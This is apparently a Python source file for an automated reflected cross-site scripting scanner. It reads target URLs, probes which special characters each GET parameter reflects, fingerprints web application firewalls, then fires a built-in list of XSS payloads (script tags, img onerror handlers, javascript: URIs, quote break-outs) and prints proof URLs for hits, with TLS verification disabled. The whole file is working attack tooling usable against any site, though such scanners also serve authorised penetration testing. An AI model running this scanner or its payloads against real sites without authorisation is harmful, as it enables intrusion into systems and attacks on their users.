import requests
import re
import json
import sys
import threading
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor
from optparse import OptionParser
try:
    from colorama import Fore, init
    init()
except ImportError:
    # Fallback if colorama is not installed
    class Fore:
        LIGHTBLUE_EX = ""
        WHITE = ""
        GREEN = ""
        BLUE = ""
        RED = ""
        LIGHTGREEN_EX = ""
        LIGHTWHITE_EX = ""

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print(Fore.LIGHTBLUE_EX + r"""
                 _     _ _______ _______  _    _ _____ ______  _______ _______
                  \___/  |______ |______   \  /    |   |_____] |______ |______
                 _/   \_ ______| ______|    \/   __|__ |_____] |______ ______|
                                 #Harmonizing Web Safety
                                  #Author: Faiyaz Ahmad (Fixed Version)
            """ + Fore.WHITE)

# Built-in modules to replace missing dependencies
class HeaderParser:
    @staticmethod
    def header_parser(header_list):
        """Parse headers from command line format"""
        headers = {}
        if not header_list:
            return headers
        
        for header in header_list:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
        return headers

class DangerousCharacters:
    def __init__(self):
        self.dangerous_characters = [
            '"', "'", '<', '>', '&', '/', '\\', '(', ')', 
            '{', '}', '[', ']', ';', ':', '=', '+', '-', 
            '*', '%', '$', '#', '@', '!', '?', '|', '~', '`'
        ]

class WafDetector:
    def __init__(self, url):
        self.url = url
    
    def waf_detect(self):
        """Basic WAF detection"""
        try:
            test_payload = "<script>alert('xss')</script>"
            parsed_url = urlparse(self.url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            response = requests.get(
                base_url, 
                params={'test': test_payload}, 
                timeout=10,
                verify=False
            )
            
            # Simple WAF detection based on common responses
            waf_signatures = {
                'cloudflare': ['cloudflare', 'cf-ray'],
                'akamai': ['akamai', 'ghost'],
                'incapsula': ['incapsula', '_incap_'],
                'sucuri': ['sucuri', 'x-sucuri'],
                'barracuda': ['barracuda', 'barra'],
                'f5': ['f5', 'bigip'],
                'aws': ['aws', 'cloudfront']
            }
            
            response_text = response.text.lower()
            response_headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            for waf_name, signatures in waf_signatures.items():
                for signature in signatures:
                    if signature in response_text or any(signature in header for header in response_headers.values()):
                        return waf_name
            
            return None
        except Exception:
            return None

# Default payloads if payloads.json is not available
DEFAULT_PAYLOADS = [
    {
        "Payload": "<script>alert('XSS')</script>",
        "Attribute": ['"', "'", '<', '>', '(', ')'],
        "waf": None,
        "count": 0
    },
    {
        "Payload": "javascript:alert('XSS')",
        "Attribute": [':', '(', ')', "'"],
        "waf": None,
        "count": 0
    },
    {
        "Payload": "\"><script>alert('XSS')</script>",
        "Attribute": ['"', '>', '<', '(', ')', "'"],
        "waf": None,
        "count": 0
    },
    {
        "Payload": "'><script>alert('XSS')</script>",
        "Attribute": ["'", '>', '<', '(', ')', "'"],
        "waf": None,
        "count": 0
    },
    {
        "Payload": "<img src=x onerror=alert('XSS')>",
        "Attribute": ['<', '>', '=', '(', ')', "'"],
        "waf": None,
        "count": 0
    }
]

parser = OptionParser()
parser.add_option('-f', dest='filename', help="specify Filename to scan. Eg: urls.txt etc")
parser.add_option("-u", dest="url", help="scan a single URL. Eg: http://example.com/?id=2")
parser.add_option('-o', dest='output', help="filename to store output. Eg: result.txt")
parser.add_option('-t', dest='threads', help="no of threads to send concurrent requests(Max: 10)")
parser.add_option('-H', dest='headers', help="specify Custom Headers")
parser.add_option('--waf', dest='waf', action='store_true', help="detect web application firewall and then test payloads")
parser.add_option('-w', dest='custom_waf', help='use specific payloads related to W.A.F')
parser.add_option('--crawl', dest='crawl', help='crawl then find xss', action="store_true")
parser.add_option('--pipe', dest="pipe", action="store_true", help="pipe output of a process as an input")

val, args = parser.parse_args()
filename = val.filename
threads = val.threads
output = val.output
url = val.url
crawl = val.crawl
waf = val.waf
pipe = val.pipe
custom_waf = val.custom_waf
headers = val.headers

# Parse headers safely
try:
    if headers:
        print(Fore.WHITE + "[+] HEADERS: {}".format(headers))
        headers = HeaderParser.header_parser(headers.split(','))
    else:
        headers = {}
except Exception as e:
    print(f"Error parsing headers: {e}")
    headers = {}

# Parse threads safely
try:
    threads = int(threads) if threads else 1
except (TypeError, ValueError):
    threads = 1

if threads > 10:
    threads = 10  # Increased from hardcoded 7

class Main:
    def __init__(self, url=None, filename=None, output=None, headers=None):
        self.filename = filename
        self.url = url
        self.output = output
        self.headers = headers or {}
        self.result = []
        self.result_lock = threading.Lock()

    def validate_url(self, url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except Exception:
            return False

    def read(self, filename):
        """Read & sort GET urls from given filename"""
        print(Fore.WHITE + "[+] READING URLS")
        try:
            with open(filename, 'r') as f:
                urls = []
                for line in f:
                    line = line.strip()
                    if line and '=' in line and self.validate_url(line):
                        urls.append(line)
                
                if not urls:
                    print(Fore.GREEN + "[+] NO VALID URLS WITH GET PARAMETERS FOUND")
                    return []
                
                # Remove duplicates while preserving order
                seen = set()
                unique_urls = []
                for url in urls:
                    if url not in seen:
                        seen.add(url)
                        unique_urls.append(url)
                
                return unique_urls
        except FileNotFoundError:
            print(f"Error: File {filename} not found")
            return []
        except Exception as e:
            print(f"Error reading file: {e}")
            return []

    def write(self, output, value):
        """Writes the output to the given filename safely"""
        if not output:
            return None
        try:
            with open(output, 'a') as f:
                f.write(f"{value}\n")
        except Exception as e:
            print(f"Error writing to file: {e}")

    def replace_param_value(self, url, param_name, value):
        """Replace parameter value in URL"""
        return re.sub(f"{param_name}=([^&]*)", f"{param_name}={value}", url)

    def get_parameters(self, url):
        """Extract parameter names from URL"""
        try:
            params = urlparse(url).query
            if not params:
                return []
            
            param_names = []
            for param_pair in params.split("&"):
                if '=' in param_pair:
                    param_name = param_pair.split("=")[0]
                    if param_name:  # Avoid empty parameter names
                        param_names.append(param_name)
            
            return param_names
        except Exception:
            return []

    def build_url_with_params(self, base_url, params):
        """Build URL with parameters safely"""
        try:
            parsed_url = urlparse(base_url)
            query_string = urlencode(params)
            return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
        except Exception:
            return base_url

    def parse_and_replace_param(self, url, param_name, value):
        """Parse URL and replace specific parameter value"""
        try:
            parsed_data = urlparse(url)
            params = {}
            
            if parsed_data.query:
                for param_pair in parsed_data.query.split("&"):
                    if '=' in param_pair:
                        key, val = param_pair.split("=", 1)
                        params[key] = val
            
            params[param_name] = value
            return params
        except Exception:
            return {}

    def test_reflection(self, url, param_name, test_chars, session=None):
        """Test if characters are reflected in response"""
        reflected_chars = []
        
        if not session:
            session = requests.Session()
        
        try:
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            for char in test_chars[:10]:  # Limit to prevent too many requests
                test_value = char + "randomstring123"
                params = self.parse_and_replace_param(url, param_name, test_value)
                
                try:
                    response = session.get(
                        base_url, 
                        params=params, 
                        headers=self.headers,
                        timeout=10,
                        verify=False
                    )
                    
                    if test_value in response.text:
                        reflected_chars.append(char)
                        if not threads or threads == 1:
                            print(Fore.GREEN + f"[+] Character '{char}' is reflecting in the response")
                
                except requests.RequestException:
                    continue
                    
        except Exception as e:
            if not threads or threads == 1:
                print(f"Error testing reflection: {e}")
        
        return reflected_chars

    def load_payloads(self):
        """Load payloads from file or use defaults"""
        try:
            with open("payloads.json", 'r') as f:
                payloads = json.load(f)
                # Reset count for each payload
                for payload in payloads:
                    payload['count'] = 0
                return payloads
        except FileNotFoundError:
            print(Fore.WHITE + "[+] payloads.json not found, using default payloads")
            return DEFAULT_PAYLOADS.copy()
        except Exception as e:
            print(f"Error loading payloads: {e}")
            return DEFAULT_PAYLOADS.copy()

    def filter_payloads(self, reflected_chars, firewall):
        """Filter payloads based on reflected characters and WAF"""
        payloads = self.load_payloads()
        
        if not reflected_chars:
            return []
        
        filtered_payloads = []
        
        # Filter by WAF if specified
        if firewall:
            print(Fore.GREEN + f"[+] FILTERING PAYLOADS FOR {firewall.upper()}")
            waf_payloads = [p for p in payloads if p.get('waf') == firewall]
            if waf_payloads:
                payloads = waf_payloads
            else:
                print(Fore.GREEN + "[+] NO SPECIFIC PAYLOADS FOUND FOR THIS WAF, USING GENERIC")
                payloads = [p for p in payloads if not p.get('waf')]
        else:
            payloads = [p for p in payloads if not p.get('waf')]
        
        # Score payloads based on reflected characters
        for payload in payloads:
            attributes = payload.get('Attribute', [])
            score = sum(1 for char in reflected_chars if char in attributes)
            payload['count'] = score
        
        # Sort by score and filter
        payloads.sort(key=lambda x: x['count'], reverse=True)
        
        min_score = max(1, len(reflected_chars) // 2)
        for payload in payloads:
            if payload['count'] >= min_score:
                filtered_payloads.append(payload['Payload'])
        
        return filtered_payloads[:20]  # Limit number of payloads

    def scanner(self, url):
        """Main scanning function"""
        if not self.validate_url(url):
            print(f"Error: Invalid URL {url}")
            return None
        
        print(Fore.WHITE + f"[+] TESTING {url}")
        
        # WAF Detection
        firewall = None
        if waf:
            print(Fore.LIGHTGREEN_EX + "[+] DETECTING WAF")
            detector = WafDetector(url)
            firewall = detector.waf_detect()
            if firewall:
                print(Fore.LIGHTGREEN_EX + f"[+] {firewall.upper()} DETECTED")
            else:
                print(Fore.LIGHTGREEN_EX + "[+] NO WAF FOUND! GOING WITH NORMAL PAYLOADS")
        elif custom_waf:
            firewall = custom_waf
        
        # Get parameters
        parameters = self.get_parameters(url)
        if not parameters:
            if not threads or threads == 1:
                print(f"[+] NO GET PARAMETERS IDENTIFIED...SKIPPING")
            return None
        
        if not threads or threads == 1:
            print(f"[+] {len(parameters)} parameters identified: {', '.join(parameters)}")
        
        session = requests.Session()
        dangerous_chars = DangerousCharacters().dangerous_characters
        
        # Test each parameter
        for param in parameters:
            if not threads or threads == 1:
                print(Fore.WHITE + f"[+] Testing parameter: {param}")
            
            # Test character reflection
            reflected_chars = self.test_reflection(url, param, dangerous_chars, session)
            
            if not reflected_chars:
                if not threads or threads == 1:
                    print(f"[+] No character reflection found for parameter {param}")
                continue
            
            # Get filtered payloads
            payloads = self.filter_payloads(reflected_chars, firewall)
            
            if not payloads:
                if not threads or threads == 1:
                    print(f"[+] No suitable payloads found for parameter {param}")
                continue
            
            # Test payloads
            for payload in payloads:
                try:
                    params = self.parse_and_replace_param(url, param, payload)
                    parsed_url = urlparse(url)
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    
                    response = session.get(
                        base_url,
                        params=params,
                        headers=self.headers,
                        timeout=10,
                        verify=False
                    )
                    
                    if payload in response.text:
                        vulnerable_url = self.replace_param_value(url, param, payload)
                        print(Fore.RED + f"[+] VULNERABLE: {url}")
                        print(f"PARAMETER: {param}")
                        print(f"PAYLOAD: {payload}")
                        print(f"PROOF: {vulnerable_url}")
                        
                        with self.result_lock:
                            self.result.append(vulnerable_url)
                        return True
                        
                except requests.RequestException as e:
                    if not threads or threads == 1:
                        print(f"Network error: {e}")
                    continue
                except Exception as e:
                    if not threads or threads == 1:
                        print(f"Error testing payload: {e}")
                    continue
        
        if not threads or threads == 1:
            print(Fore.LIGHTWHITE_EX + f"[+] TARGET SEEMS TO BE NOT VULNERABLE")
        return None

if __name__ == "__main__":
    urls = []
    
    try:
        if url and not filename:
            # Single URL scan
            scanner = Main(url=url, output=output, headers=headers)
            scanner.scanner(url)
            if scanner.result:
                scanner.write(output, scanner.result[0])
            sys.exit(0)
            
        elif filename:
            # File-based scan
            scanner = Main(filename=filename, output=output, headers=headers)
            if crawl:
                print(Fore.BLUE + "[+] CRAWLING NOT IMPLEMENTED - Please provide URLs directly")
                sys.exit(1)
            urls = scanner.read(filename)
            
        elif pipe:
            # Pipe input
            scanner = Main(output=output, headers=headers)
            for line in sys.stdin:
                line = line.strip()
                if line and scanner.validate_url(line):
                    urls.append(line)
        else:
            print("Error: Please specify either -u for single URL or -f for file input")
            sys.exit(1)
        
        if not urls:
            print("No valid URLs to scan")
            sys.exit(1)
        
        print(Fore.GREEN + f"[+] SCANNING {len(urls)} URLs WITH {threads} THREADS")
        
        # Run scanner with threading
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(scanner.scanner, urls)
        
        # Write results
        if scanner.result:
            print(Fore.GREEN + f"[+] FOUND {len(scanner.result)} VULNERABLE URLs")
            for result in scanner.result:
                scanner.write(output, result)
        else:
            print(Fore.WHITE + "[+] NO VULNERABILITIES FOUND")
        
        print(Fore.WHITE + "[+] SCAN COMPLETED")
        
    except KeyboardInterrupt:
        print("\n[+] SCAN INTERRUPTED BY USER")
    except Exception as e:
        print(f"Fatal error: {e}")
